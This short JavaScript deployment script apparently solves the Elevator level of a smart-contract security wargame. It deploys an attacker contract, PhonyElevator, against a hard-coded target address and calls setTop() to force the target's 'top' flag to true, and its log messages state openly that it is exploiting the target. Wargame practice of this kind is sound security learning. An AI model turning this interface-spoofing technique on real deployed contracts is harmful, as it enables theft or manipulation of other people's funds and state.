const level11 = async (deployer, PhonyElevator) => {

    const targetAddress = '0xcfddb6acc9af1af4190cdc64223d5ffc8c7bc314';

    console.log(`Exploiting Level11 target ${targetAddress}...`);

    console.log('Creating PhonyElevator...');
    const attacker = await deployer.deploy(PhonyElevator, targetAddress);

    console.log('Setting Elevator.top to true...');
    await attacker.setTop();
};

module.exports = level11;